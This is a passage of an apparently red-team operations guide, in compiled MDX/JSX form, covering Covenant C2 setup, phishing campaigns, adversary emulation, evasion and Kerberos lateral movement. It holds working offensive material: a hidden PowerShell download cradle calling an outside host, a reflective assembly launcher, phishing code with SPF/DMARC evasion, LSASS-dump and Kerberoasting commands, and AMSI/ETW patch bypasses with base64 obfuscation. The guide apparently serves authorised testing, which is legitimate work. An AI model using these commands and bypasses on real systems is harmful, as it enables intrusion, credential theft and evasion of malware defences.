        children: "# Install Covenant (Linux)\nsudo apt install dotnet-sdk-8.0 -y\ngit clone https://github.com/cobbr/Covenant\ncd Covenant/Covenant\ndotnet build\ndotnet run --urls \"https://0.0.0.0:7443\"\n# Default: admin / Admin123! (CHANGE IMMEDIATELY)\n\n# Listener: Web UI > Listeners > Create > HTTP Profile\n# Launcher: Launchers > Create > Binary (or PowerShell, MSBuild, etc.)\n# Grunt interaction: Grunts > Click grunt > Interact\n\n# PowerShell stager output:\n# powershell -NoP -NonI -W Hidden -Exec Bypass -C \"IEX (New-Object Net.WebClient).DownloadString('https://cdn.acme-cdn.com/connect')\"\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "43-covenant-dynamic-task-compilation-typescript",
      children: "4.3 Covenant Dynamic Task Compilation (TypeScript)"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-typescript",
        children: "// covenant-task-compiler.ts — Dynamic C# Compilation\n\ninterface CovenantTask { id: string; name: string; sourceCode: string; references: string[]; outputType: string; }\ninterface CompiledTask { taskId: string; assemblyBytes: Buffer; entryPoint: string; compileTimeMs: number; }\n\nclass CovenantCompiler {\n  private tasks: Map<string, CovenantTask> = new Map();\n\n  register(task: CovenantTask): void { this.tasks.set(task.id, task); }\n\n  compile(taskId: string): CompiledTask | null {\n    const t = this.tasks.get(taskId); if (!t) return null;\n    const start = Date.now();\n    const bytes = Buffer.from(t.sourceCode);\n    const ep = this.findEntry(t.sourceCode) || t.name + '.Main';\n    return { taskId, assemblyBytes: bytes, entryPoint: ep, compileTimeMs: Date.now() - start };\n  }\n\n  generateLauncher(taskId: string, type: 'powershell' | 'msbuild'): string {\n    const c = this.compile(taskId); if (!c) return '';\n    const b64 = c.assemblyBytes.toString('base64');\n    if (type === 'powershell') return '$bytes=[System.Convert]::FromBase64String(\"' + b64 + '\");[System.Reflection.Assembly]::Load($bytes).EntryPoint.Invoke($null,@(,[string[]]@()))';\n    return '<?xml version=\"1.0\"?><Project ToolsVersion=\"4.0\" xmlns=\"http://schemas.microsoft.com/developer/msbuild/2003\"><Target Name=\"Build\"><Csc Sources=\"$(MSBuildProjectDirectory)\\\\' + taskId + '.cs\" OutputAssembly=\"$(MSBuildProjectDirectory)\\\\' + taskId + '.exe\"/></Target></Project>';\n  }\n\n  createTask(name: string, source: string): string {\n    const id = 'TASK-' + Date.now().toString(36);\n    this.register({ id, name, sourceCode: source, references: ['System.dll'], outputType: 'exe' });\n    return id;\n  }\n\n  private findEntry(source: string): string | null {\n    const m = source.match(/static\\s+void\\s+Main\\s*\\(/);\n    if (m) { const cls = source.slice(0, m.index).match(/class\\s+(\\w+)/); const ns = source.slice(0, m.index).match(/namespace\\s+(\\w+(?:\\.\\w+)*)/); if (cls) return ns ? ns[1] + '.' + cls[1] + '.Main' : cls[1] + '.Main'; }\n    return null;\n  }\n}\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "5-phishing-operations",
      children: "5. Phishing Operations"
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "51-gophish-deployment",
      children: "5.1 GoPhish Deployment"
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: "GoPhish is the most widely used open-source phishing framework. It provides a web UI for managing campaigns, sending emails, hosting landing pages, and tracking results."
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "SMTP Relay Setup:"
      })
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Provider"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Host"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Port"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Auth"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Notes"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "SendGrid"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "smtp.sendgrid.net"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "587"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "API Key"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Requires domain verification"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "AWS SES"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "email-smtp.us-east-1.amazonaws.com"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "587"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "SMTP creds"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Requires domain verification"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Mailgun"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "smtp.mailgun.org"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "587"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "SMTP creds"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Good reputation, easy setup"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Postfix"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "self-hosted"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "587"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "SASL"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Full control, IP warmup needed"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "SPF/DKIM/DMARC Evasion Strategies:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Domain Shadowing: Create subdomain on compromised DNS (login.acme-company.com)"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Lookalike Domain: Register acme-company.xyz (homoglyph attack with Cyrillic chars)"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Compromised Account: Send from legitimate user account within target domain"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "SPF Bypass: Use VPS IP already included in target SPF record"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "DMARC Bypass: Send to subdomain without DMARC policy (not inherited from parent)"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Reputable ESP: Use SendGrid/Mailgun with authenticated domain transfer"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "IP Warming: Gradually increase send volume from new IP over 2-4 weeks"
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "GoPhish API Campaign Creation:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "curl -k -X POST https://localhost:3333/api/smtp/ \\\n  -H \"Authorization: API-KEY\" -H \"Content-Type: application/json\" \\\n  -d '{\"name\":\"Acme IT\",\"interface_type\":\"SMTP\",\"host\":\"smtp.sendgrid.net:587\",\"username\":\"apikey\",\"password\":\"SG.xxx\",\"from_address\":\"it@acme-company.com\"}'\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "52-phishing-campaign-manager-typescript",
      children: "5.2 Phishing Campaign Manager (TypeScript)"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-typescript",
        children: "// phishing-campaign-manager.ts — Campaign Orchestration with Tracking\n\ninterface EmailTemplate {\n  id: string; name: string; subject: string; htmlBody: string;\n  fromAddress: string; fromName: string; trackingPixelEnabled: boolean;\n}\n\ninterface Recipient {\n  email: string; firstName: string; lastName: string;\n  position: string; department: string;\n}\n\ninterface PhishingCampaign {\n  id: string; name: string; status: 'draft' | 'running' | 'completed';\n  template: EmailTemplate; recipients: Recipient[];\n  url: string; sent: number; opened: number; clicked: number; submitted: number;\n}\n\nclass PhishingManager {\n  private campaigns: Map<string, PhishingCampaign> = new Map();\n  private events: any[] = [];\n\n  createCampaign(config: {\n    name: string; template: EmailTemplate; recipients: Recipient[]; url: string;\n  }): PhishingCampaign {\n    const c: PhishingCampaign = {\n      id: `PH-${Date.now().toString(36)}`, name: config.name,\n      status: 'draft', template: config.template, recipients: config.recipients,\n      url: config.url, sent: 0, opened: 0, clicked: 0, submitted: 0,\n    };\n    this.campaigns.set(c.id, c);\n    return c;\n  }\n\n  generateTrackingPixel(email: string): string {\n    const pid = `px-${Buffer.from(email).toString('base64').slice(0, 12)}-${Math.random().toString(36).slice(2, 8)}`;\n    return '<img src=\"' + this.url + '/track/' + pid + '.png\" width=\"1\" height=\"1\" style=\"display:none\" />';\n  }\n\n  private url = 'https://phish.acme-campaign.net';\n\n  personalize(c: PhishingCampaign, r: Recipient): string {\n    let body = c.template.htmlBody;\n    const subs: Record<string, string> = {\n      '{{FIRST}}': r.firstName, '{{LAST}}': r.lastName,\n      '{{EMAIL}}': r.email,\n      '{{URL}}': c.url + '/login?rid=' + Buffer.from(r.email).toString('base64'),\n    };\n    for (const [k, v] of Object.entries(subs)) body = body.replaceAll(k, v);\n    if (c.template.trackingPixelEnabled) body += this.generateTrackingPixel(r.email);\n    return body;\n  }\n\n  async launch(campaignId: string): Promise<void> {\n    const c = this.campaigns.get(campaignId); if (!c || c.status !== 'draft') return;\n    c.status = 'running';\n    for (const r of c.recipients) {\n      console.log('[SEND] -> ' + r.email + ': ' + c.template.subject);\n      c.sent++;\n      await new Promise(r => setTimeout(r, 100 + Math.random() * 50));\n    }\n    c.status = 'completed';\n    console.log('Campaign complete: ' + c.sent + ' sent');\n  }\n\n  trackEvent(campaignId: string, type: 'opened' | 'clicked' | 'submitted', email: string): void {\n    const c = this.campaigns.get(campaignId); if (!c) return;\n    this.events.push({\n      timestamp: new Date(), type, email,\n      ip: '10.0.' + Math.floor(Math.random() * 255) + '.' + Math.floor(Math.random() * 255),\n    });\n    if (type === 'opened') c.opened++;\n    else if (type === 'clicked') c.clicked++;\n    else if (type === 'submitted') c.submitted++;\n  }\n\n  getStats(id: string): string {\n    const c = this.campaigns.get(id)!;\n    const or = c.sent > 0 ? ((c.opened / c.sent) * 100).toFixed(1) : '0';\n    const cr = c.opened > 0 ? ((c.clicked / c.opened) * 100).toFixed(1) : '0';\n    return 'Sent: ' + c.sent + ' | Opened: ' + c.opened + ' (' + or + '%) | Clicked: ' + c.clicked + ' (' + cr + '%) | Submitted: ' + c.submitted;\n  }\n}\n\nfunction phishDemo() {\n  const m = new PhishingManager();\n  const c = m.createCampaign({\n    name: 'Q1 Phishing Sim', url: 'https://phish.acme-campaign.net',\n    template: {\n      id: 'T1', name: 'Password Expiry',\n      subject: 'Action: Password Expires in 24 Hours',\n      htmlBody: '<p>Dear {{FIRST}}, your password expires soon. <a href=\"{{URL}}\">Verify Now</a></p>',\n      fromAddress: 'it@acme-company.com', fromName: 'IT Security',\n      trackingPixelEnabled: true,\n    },\n    recipients: [\n      { email: 'john@acme.com', firstName: 'John', lastName: 'Doe', position: 'CFO', department: 'Finance' },\n      { email: 'jane@acme.com', firstName: 'Jane', lastName: 'Smith', position: 'Controller', department: 'Finance' },\n    ],\n  });\n  m.trackEvent(c.id, 'opened', 'john@acme.com');\n  m.trackEvent(c.id, 'clicked', 'john@acme.com');\n  m.trackEvent(c.id, 'submitted', 'john@acme.com');\n  console.log(m.getStats(c.id));\n}\n// phishDemo();\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "53-tracking-pixel-architecture",
      children: "5.3 Tracking Pixel Architecture"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "Email Client ---> Tracking Pixel (1x1 img) ---> GoPhish Server ---> Event Log (IP, UA, Time)\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: "When the email client loads the tracking pixel (a 1x1 transparent GIF), the GoPhish server logs the request details including IP address, user-agent, and timestamp. This provides open-rate analytics and geolocation data."
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "6-adversary-emulation",
      children: "6. Adversary Emulation"
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "61-mitre-attck-mapping",
      children: "6.1 MITRE ATT&CK Mapping"
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: "Adversary emulation executes specific threat actor TTPs to test detection coverage. The MITRE ATT&CK framework provides a structured taxonomy."
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-typescript",
        children: "// adversary-emulation.ts — MITRE ATT&CK Mapper and Atomic Tests\n\ninterface MITRETechnique {\n  id: string; name: string; tactic: string; platform: string[];\n  mitigations: string[]; detections: string[];\n}\n\ninterface ThreatActor {\n  name: string; aliases: string[]; origin: string; motivation: string;\n  techniquesUsed: { techniqueId: string; procedure: string }[];\n  knownCampaigns: string[];\n}\n\ninterface AtomicTest {\n  id: string; technique: string; name: string;\n  command: string; cleanupCommand: string; elevationRequired: boolean;\n}\n\nclass MITREMapper {\n  private techniques: Map<string, MITRETechnique> = new Map();\n  private actors: Map<string, ThreatActor> = new Map();\n  private tests: Map<string, AtomicTest> = new Map();\n\n  constructor() {\n    this.techniques.set('T1059.001', {\n      id: 'T1059.001', name: 'PowerShell', tactic: 'Execution',\n      platform: ['Windows'], mitigations: ['Constrained Language'],\n      detections: ['Event 4688'],\n    });\n    this.techniques.set('T1003.001', {\n      id: 'T1003.001', name: 'LSASS Memory', tactic: 'Credential Access',\n      platform: ['Windows'], mitigations: ['Credential Guard'],\n      detections: ['Event 4663'],\n    });\n    this.techniques.set('T1558.003', {\n      id: 'T1558.003', name: 'Kerberoasting', tactic: 'Credential Access',\n      platform: ['Windows'], mitigations: ['gMSA', 'Strong passwords'],\n      detections: ['Event 4769 RC4'],\n    });\n    this.techniques.set('T1021.002', {\n      id: 'T1021.002', name: 'SMB Admin Shares', tactic: 'Lateral Movement',\n      platform: ['Windows'], mitigations: ['SMB signing'],\n      detections: ['Event 5140'],\n    });\n    this.techniques.set('T1071.001', {\n      id: 'T1071.001', name: 'Web Protocols', tactic: 'C2',\n      platform: ['Windows', 'Linux'], mitigations: ['SSL inspection'],\n      detections: ['JA3/S', 'Beaconing'],\n    });\n    this.techniques.set('T1543.003', {\n      id: 'T1543.003', name: 'Windows Service', tactic: 'Persistence',\n      platform: ['Windows'], mitigations: ['Service ACLs'],\n      detections: ['Event 7045'],\n    });\n    this.techniques.set('T1204.002', {\n      id: 'T1204.002', name: 'Malicious File', tactic: 'Execution',\n      platform: ['Windows'], mitigations: ['User training'],\n      detections: ['Event 4688', 'AMSI'],\n    });\n\n    this.actors.set('APT29', {\n      name: 'APT29', aliases: ['Cozy Bear', 'Nobelium'], origin: 'Russia',\n      motivation: 'Intelligence gathering (SVR)',\n      techniquesUsed: [\n        { techniqueId: 'T1059.001', procedure: 'PowerShell Empire implant' },\n        { techniqueId: 'T1071.001', procedure: 'HTTPS C2 via fake blog infrastructure' },\n        { techniqueId: 'T1003.001', procedure: 'Mimikatz credential extraction' },\n        { techniqueId: 'T1543.003', procedure: 'Service persistence in SolarWinds Orion' },\n        { techniqueId: 'T1021.002', procedure: 'SMB propagation with stolen hashes' },\n      ],\n      knownCampaigns: ['SolarWinds (2020)', 'Hacking Team (2015)', 'DNC (2016)'],\n    });\n\n    this.actors.set('APT41', {\n      name: 'APT41', aliases: ['WinNTI', 'Barium'], origin: 'China',\n      motivation: 'Cyber espionage + financial gain',\n      techniquesUsed: [\n        { techniqueId: 'T1059.001', procedure: 'PowerShell download cradle' },\n        { techniqueId: 'T1204.002', procedure: 'Spearphishing with ISO/LNK payloads' },\n        { techniqueId: 'T1003.001', procedure: 'Procdump for LSASS' },\n        { techniqueId: 'T1021.002', procedure: 'SMB lateral movement' },\n        { techniqueId: 'T1071.001', procedure: 'HTTPS C2 with custom protocol' },\n      ],\n      knownCampaigns: ['Video game industry (2017)', 'COVID-19 research (2020)', 'VPN exploitation (2021)'],\n    });\n\n    this.tests.set('AT-201', {\n      id: 'AT-201', technique: 'T1059.001', name: 'PowerShell Download Cradle',\n      command: 'powershell -NoP -NonI -W Hidden -Exec Bypass -C \"IEX (New-Object Net.WebClient).DownloadString(\\'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.ps1\\')\"',\n      cleanupCommand: 'Remove-Item \"$env:TEMP\\\\atomic-*.txt\" -EA SilentlyContinue',\n      elevationRequired: false,\n    });\n    this.tests.set('AT-301', {\n      id: 'AT-301', technique: 'T1003.001', name: 'LSASS Dump via Comsvcs',\n      command: 'rundll32.exe C:\\\\Windows\\\\System32\\\\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\\\\Windows\\\\Temp\\\\lsass.dmp full',\n      cleanupCommand: 'Remove-Item C:\\\\Windows\\\\Temp\\\\lsass.dmp -EA SilentlyContinue',\n      elevationRequired: true,\n    });\n    this.tests.set('AT-401', {\n      id: 'AT-401', technique: 'T1558.003', name: 'Kerberoasting with Rubeus',\n      command: 'Rubeus.exe kerberoast /outfile:C:\\\\Windows\\\\Temp\\\\kerb-hashes.txt',\n      cleanupCommand: 'Remove-Item C:\\\\Windows\\\\Temp\\\\kerb-hashes.txt -EA SilentlyContinue',\n      elevationRequired: false,\n    });\n  }\n\n  getPlan(actorName: string): string {\n    const actor = this.actors.get(actorName);\n    if (!actor) return 'Actor not found';\n    const tests = actor.techniquesUsed\n      .map(t => Array.from(this.tests.values()).filter(at => at.technique === t.techniqueId))\n      .flat();\n    return 'Emulation Plan: ' + actor.name + '\\n' +\n      tests.map((t, i) => '  ' + (i + 1) + '. ' + t.name + ': ' + t.command).join('\\n');\n  }\n}\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "62-apt-emulation-procedures",
      children: "6.2 APT Emulation Procedures"
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "APT29 (Cozy Bear / Nobelium) — SolarWinds Campaign:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: "Phase 1 — Initial Access: Compromise SolarWinds Orion build system, insert SUNBURST backdoor into Orion DLLs, digitally sign malicious update. Phase 2 — C2 Communication: Obfuscated HTTP C2 with fake blog infrastructure, domain avsvmcloud[.]com, beacon interval 12-24 hours with jitter. Phase 3 — Lateral Movement: TEARDROP and RAINDROP loaders, Mimikatz for credential extraction, SMB and WMI propagation. Phase 4 — Exfiltration: Stage data in compromised on-prem servers, exfiltrate over encrypted HTTPS channels, target email data (OWA/EWS) and cloud provider tokens."
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "APT41 (WinNTI / Barium):"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: "Phase 1 — Initial Access: Spearphishing with ISO/LNK files, exploit VPN appliances (CVE-2019-19781, CVE-2020-5902). Phase 2 — C2 Communication: Custom C2 protocol over HTTPS, multi-stage payload delivery. Phase 3 — Lateral Movement: WMI and PsExec with stolen credentials, GPO modification, service persistence. Phase 4 — Exfiltration: Data staged to internal server, exfil over HTTPS and DNS tunneling, target game source code, IP, user databases."
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "7-evasion-techniques",
      children: "7. Evasion Techniques"
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "71-amsi-bypass",
      children: "7.1 AMSI Bypass"
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: "The Anti-Malware Scan Interface (AMSI) allows Windows apps to request malware scans of content. PowerShell, VBA, and .NET all integrate with AMSI. Bypasses modify AmsiScanBuffer in amsi.dll to always return AMSI_RESULT_CLEAN."
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-typescript",
        children: "// amsi-bypass-generator.ts — AMSI/ETW Bypass String Generator\n\ninterface BypassTechnique {\n  name: string; method: 'patching' | 'reflection' | 'registry';\n  detectionRisk: 'low' | 'medium' | 'high'; effectiveness: 'partial' | 'full';\n  script: string;\n}\n\nclass AmsiBypassGenerator {\n  private techniques: BypassTechnique[] = [\n    {\n      name: 'AmsiScanBuffer Patch',\n      method: 'patching', detectionRisk: 'high', effectiveness: 'full',\n      script: '[Runtime.InteropServices.Marshal]::Copy(@(0x31,0xC0,0xC3),0,[Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer([Runtime.InteropServices.Marshal]::GetProcAddress([Runtime.InteropServices.Marshal]::LoadLibrary(\"amsi.dll\"),\"AmsiScanBuffer\"),[Type]([Object])),3)',\n    },\n    {\n      name: 'AMSI Reflection Bypass',\n      method: 'reflection', detectionRisk: 'medium', effectiveness: 'full',\n      script: '[Ref].Assembly.GetType(\"System.Management.Automation.AmsiUtils\").GetField(\"amsiInitFailed\",\"NonPublic,Static\").SetValue($null,$true)',\n    },\n    {\n      name: 'Registry Disable',\n      method: 'registry', detectionRisk: 'medium', effectiveness: 'partial',\n      script: 'Set-ItemProperty -Path \"HKLM:\\\\SOFTWARE\\\\Microsoft\\\\AMSI\\\\Providers\" -Name \"{2781761E-28E0-4109-99FE-B9D127C57AFE}\" -Value \"\" -Force',\n    },\n  ];\n\n  generateObfuscated(techniqueName?: string): string {\n    const techs = techniqueName\n      ? this.techniques.filter(t => t.name.toLowerCase().includes(techniqueName.toLowerCase()))\n      : this.techniques;\n    if (techs.length === 0) return '';\n    const tech = techs[Math.floor(Math.random() * techs.length)];\n    const b64 = Buffer.from(tech.script, 'utf-8').toString('base64');\n    const variants = [\n      tech.script,\n      'IEX ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(\"' + b64 + '\")))',\n      '$a=\"' + b64 + '\";$b=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($a));IEX $b',\n    ];\n    return variants[Math.floor(Math.random() * variants.length)];\n  }\n\n  generateETWBypass(): string {\n    return '[Runtime.InteropServices.Marshal]::Copy(@(0x48,0x31,0xC0,0xC3),0,[Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer([Runtime.InteropServices.Marshal]::GetProcAddress([Runtime.InteropServices.Marshal]::LoadLibrary(\"ntdll.dll\"),\"EtwEventWrite\"),[Type]([Object])),4)';\n  }\n\n  generateFull(): string {\n    return '# Full Bypass Chain\\n' + this.techniques[0].script + '\\n' + this.generateETWBypass() + '\\n' + this.techniques[1].script;\n  }\n}\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "72-syscall-direct--hells-gate-and-halos-gate",
      children: "7.2 Syscall Direct — Hell's Gate and Halo's Gate"
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: "Modern EDR hooks ntdll.dll functions to monitor syscalls. Direct syscall techniques bypass these hooks by invoking syscalls directly without going through ntdll."
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Hell's Gate:"
        }), " Dynamically finds syscall numbers by parsing ntdll.dll in memory. Extracts the mov eax, SSN; syscall; ret instructions from unhooked regions."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Halo's Gate:"
        }), " Extension that handles inlined hooks. Scans backward from the hooked address to find the original syscall."]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-typescript",
        children: "// syscall-direct.ts — Hell's Gate and Halo's Gate Simulation\n\ninterface SyscallEntry {\n  syscallNumber: number;\n  functionName: string;\n  hooked: boolean;\n}\n\nclass HellGateResolver {\n  private cache: Map<string, SyscallEntry> = new Map();\n\n  constructor() {\n    const syscalls = [\n      { name: 'NtOpenProcess', ssn: 0x26, hooked: true },\n      { name: 'NtAllocateVirtualMemory', ssn: 0x18, hooked: true },\n      { name: 'NtProtectVirtualMemory', ssn: 0x50, hooked: true },\n      { name: 'NtWriteVirtualMemory', ssn: 0x3A, hooked: true },\n      { name: 'NtCreateThreadEx', ssn: 0xC2, hooked: true },\n      { name: 'NtQuerySystemInformation', ssn: 0x36, hooked: true },\n      { name: 'NtClose', ssn: 0x0F, hooked: false },\n      { name: 'NtDelayExecution', ssn: 0x34, hooked: false },\n      { name: 'NtCreateFile', ssn: 0x55, hooked: false },\n    ];\n    for (const sc of syscalls) {\n      this.cache.set(sc.name, { syscallNumber: sc.ssn, functionName: sc.name, hooked: sc.hooked });\n    }\n  }\n\n  hellGate(name: string): SyscallEntry | null {\n    const e = this.cache.get(name);\n    return e || null;\n  }\n\n  halosGate(name: string): SyscallEntry | null {\n    const e = this.cache.get(name);\n    if (!e || !e.hooked) return e;\n    // Scan backward for clean syscall\n    const entries = Array.from(this.cache.entries());\n    const idx = entries.findIndex(([n]) => n === name);\n    for (let i = Math.max(0, idx - 5); i < idx; i++) {\n      if (!entries[i][1].hooked) {\n        return { ...e, syscallNumber: entries[i][1].syscallNumber, functionName: name + ' (via ' + entries[i][0] + ')' };\n      }\n    }\n    return null;\n  }\n\n  getStub(e: SyscallEntry): number[] {\n    return [0xB8, e.syscallNumber, 0x00, 0x00, 0x00, 0x0F, 0x05, 0xC3]; // mov eax, SSN; syscall; ret\n  }\n\n  dump(): void {\n    for (const [n, e] of this.cache) {\n      console.log(n.padEnd(30) + ' SSN: 0x' + e.syscallNumber.toString(16).padStart(2, '0') + (e.hooked ? ' [HOOKED]' : ' [CLEAN]'));\n    }\n  }\n}\n\n// Sandbox Detection\nclass SandboxDetector {\n  private checks: { name: string; suspicious: boolean }[] = [\n    { name: 'CPU cores <= 2', suspicious: false },\n    { name: 'RAM < 4GB', suspicious: false },\n    { name: 'Screen res 1024x768', suspicious: false },\n    { name: 'VM MAC prefix', suspicious: true },\n    { name: 'Processes: vmtoolsd, procmon', suspicious: true },\n    { name: 'Username: admin/sandbox/malware', suspicious: true },\n    { name: 'Not domain-joined', suspicious: true },\n  ];\n\n  isSandboxed(): boolean {\n    return this.checks.filter(c => c.suspicious).length >= 3;\n  }\n\n  report(): string {\n    return 'Sandboxed: ' + this.isSandboxed() + '\\n' +\n      this.checks.map(c => (c.suspicious ? '[!]' : '[✓]') + ' ' + c.name).join('\\n');\n  }\n}\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "73-lateral-movement-kerberos-attack-chain-diagram",
      children: "7.3 Lateral Movement Kerberos Attack Chain Diagram"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-mermaid",
        children: "sequenceDiagram\n    participant Attacker as Red Team\n    participant DC as Domain Controller\n    participant Target as Target Server\n    participant KDC as KDC (Kerberos)\n\n    Note over Attacker: Step 1: Kerberoasting\n    Attacker->>KDC: TGS-REQ (SPN request for service account)\n    KDC-->>Attacker: TGS-REP (encrypted with service account NTLM hash)\n    Note over Attacker: Offline brute-force service account password\n    Attacker->>Attacker: hashcat -m 13100 hashes.txt wordlist.txt\n\n    Note over Attacker: Step 2: Silver Ticket\n    Attacker->>Attacker: Forge TGS with service NTLM hash\n    Attacker->>Target: TGS (forged) for service access\n    Target-->>Attacker: Access granted (no DC verification)\n\n    Note over Attacker: Step 3: DCSync\n    Attacker->>DC: DRSUAPI GetNCChanges (replication)\n    DC-->>Attacker: NTDS.dit with all hashes\n\n    Note over Attacker: Step 4: Golden Ticket\n    Attacker->>Attacker: Forge TGT with KRBTGT hash\n    Attacker->>KDC: TGT (forged) for any account/domain\n    KDC-->>Attacker: Domain Admin on all systems\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "8-lateral-movement",
      children: "8. Lateral Movement"
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "81-lateral-movement-methods",
      children: "8.1 Lateral Movement Methods"
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Method"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Protocol"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Port"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Auth"
          }), (0,jsx_runtime.jsx)(_components.th, {
